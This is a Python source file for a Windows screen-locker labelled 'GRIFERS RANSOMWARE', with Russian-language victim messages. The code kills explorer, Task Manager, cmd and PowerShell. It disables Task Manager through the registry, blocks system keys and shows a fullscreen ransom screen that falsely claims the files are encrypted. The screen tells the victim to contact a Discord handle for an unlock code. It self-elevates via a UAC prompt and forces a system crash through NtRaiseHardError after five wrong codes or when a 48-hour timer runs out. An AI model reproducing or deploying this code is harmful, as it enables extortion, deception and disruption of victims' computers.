# -*- coding: utf-8 -*-
"""
GRIFERS RANSOMWARE - ВИНЛОКЕР
"""
import tkinter as tk
from tkinter import messagebox
import ctypes
import os
import sys
import threading
import time

# ==================== ПАРОЛЬ ====================
PASSWORD = "3316409865"

# ==================== БЛОКИРОВКА СИСТЕМЫ ====================
def block_system():
    try:
        os.system("taskkill /f /im explorer.exe >nul 2>&1")
        os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
        os.system("taskkill /f /im cmd.exe >nul 2>&1")
        os.system("taskkill /f /im powershell.exe >nul 2>&1")
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1')
    except:
        pass

# ==================== ВИНЛОКЕР ====================
class WinLocker:
    def __init__(self):
        self.root = None
        self.entry = None
        self.attempts = 0
        self.max_attempts = 5
        self.time_remaining = 48 * 3600
        
        block_system()
        self.create_screen()
    
    def create_screen(self):
        self.root = tk.Tk()
        self.root.title("Ваш файл зашифрован!")
        
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        self.root.geometry(f"{sw}x{sh}+0+0")
        self.root.configure(bg='#0000aa')
        
        try:
            self.root.overrideredirect(True)
            self.root.attributes('-topmost', True)
            self.root.attributes('-fullscreen', True)
        except:
            pass
        
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.block_keys()
        
        main_frame = tk.Frame(self.root, bg='#0000aa')
        main_frame.place(relx=0.5, rely=0.45, anchor=tk.CENTER)
        
        title = tk.Label(main_frame, text="Ваш файл зашифрован!",
                        font=('Arial', 28, 'bold'), fg='#ffffff', bg='#0000aa')
        title.pack(pady=(0, 20))
        
        main_text = f"""Упс! Вы подверглись масштабной хакерской атаке и теперь ваш компьютер заблокирован,
а все имеющиеся диски и файлы на них зашифрованы хакерским группой.

Любое действие, связанное с попыткой обмануть систему, может быть использовано
для защиты информации. В случае обнаружения каких-либо угроз безопасности,
вы можете воспользоваться системой защиты данных (например, у вас есть 48 часов
с момента запуска чтобы ввести код что бы получить код, напишите mrgrishast_51442 (Discord))"""
        
        text_label = tk.Label(main_frame, text=main_text, font=('Arial', 13),
                             fg='#ffffff', bg='#0000aa', justify=tk.CENTER)
        text_label.pack(pady=10)
        
        code_label = tk.Label(main_frame, text="Введите код разблокировки:",
                             font=('Arial', 14), fg='#ffffff', bg='#0000aa')
        code_label.pack(pady=(30, 5))
        
        self.entry = tk.Entry(main_frame, font=('Arial', 14), show="",
                              bg='#ffffff', fg='#000000', width=25,
                              relief=tk.SUNKEN, bd=2,
                              justify='center')
        self.entry.pack(ipady=5)
        self.entry.focus()
        self.entry.bind('<Return>', lambda e: self.check_code())
        
        bottom_frame = tk.Frame(main_frame, bg='#0000aa')
        bottom_frame.pack(pady=20)
        
        enter_btn = tk.Button(bottom_frame, text="Enter [Ввод]", font=('Arial', 11),
                             bg='#e0e0e0', fg='#000000', relief=tk.RAISED, bd=2,
                             padx=20, pady=3, command=self.check_code)
        enter_btn.pack()
        
        self.attempts_label = tk.Label(main_frame, text="", font=('Arial', 10),
                                       fg='#ff6666', bg='#0000aa')
        self.attempts_label.pack(pady=10)
        
        self.timer_label = tk.Label(main_frame, text="", font=('Arial', 12),
                                     fg='#ff6600', bg='#0000aa')
        self.timer_label.pack(pady=5)
        self.start_timer()
        
        self.root.mainloop()
    
    def start_timer(self):
        def update_timer():
            while self.time_remaining > 0 and self.root:
                try:
                    hours = self.time_remaining // 3600
                    minutes = (self.time_remaining % 3600) // 60
                    seconds = self.time_remaining % 60
                    timer_text = f"Осталось времени: {hours:02d}:{minutes:02d}:{seconds:02d}"
                    if self.timer_label:
                        self.timer_label.config(text=timer_text)
                        if hours < 1:
                            color = '#ff0000' if int(time.time()) % 2 == 0 else '#ff6600'
                            self.timer_label.config(fg=color)
                    self.time_remaining -= 1
                    time.sleep(1)
                    if self.time_remaining <= 0:
                        if self.root:
                            self.root.after(0, self.destroy_system)
                        break
                except:
                    break
        threading.Thread(target=update_timer, daemon=True).start()
    
    def block_keys(self):
        def block():
            try:
                import keyboard
                blocked = ['ctrl', 'win', 'windows', 'esc', 'alt', 'f4', 
                          'delete', 'tab', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']
                for key in blocked:
                    try:
                        keyboard.block_key(key)
                    except:
                        pass
            except:
                pass
        threading.Thread(target=block, daemon=True).start()
    
    def destroy_system(self):
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        except:
            os.system("shutdown /r /t 0 /f")
    
    def unlock_system(self):
        try:
            os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f >nul 2>&1')
            os.system("start explorer.exe")
        except:
            pass
    
    def check_code(self):
        code = self.entry.get().strip()
        
        if code == PASSWORD:
            self.unlock_system()
            self.root.destroy()
            return
            
        self.attempts += 1
        remaining = self.max_attempts - self.attempts
        
        self.attempts_label.config(text=f"Осталось попыток: {remaining}")
        self.entry.delete(0, tk.END)
        
        if self.attempts >= self.max_attempts:
            self.destroy_system()
        else:
            messagebox.showerror("Неверный код", 
                                f"Неверный код разблокировки!\nОсталось попыток: {remaining}")

# ==================== ЗАПУСК ====================
if __name__ == "__main__":
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
    except:
        pass
    
    WinLocker()